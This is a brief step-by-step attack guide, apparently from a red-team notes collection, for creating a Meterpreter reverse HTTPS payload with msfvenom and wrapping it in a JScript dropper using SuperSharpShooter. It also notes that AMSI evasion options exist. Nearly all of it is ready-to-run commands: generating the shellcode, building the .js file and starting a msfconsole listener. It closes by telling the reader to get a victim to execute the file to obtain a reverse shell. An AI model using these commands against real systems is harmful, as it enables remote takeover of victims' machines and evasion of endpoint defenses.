# Meterpreter with SuperSharpShooter

### 1) Download SuperSharpShooter project

    git clone https://github.com/ScriptIdiot/SuperSharpShooter

### 2) Craft payload

    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw -o shell.txt

### 3) Run the tool to obtain the .js code, other options like AMSI evasion are available in the documentation of the GitHub

    ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile shell.txt --payload js --output payload

### 4) Start listener

    sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKR_IP]; set lport [PORT]; exploit"

### 5) Find a way to deliver the .js file to the user and that he executes it, then you should get your reverse shell.
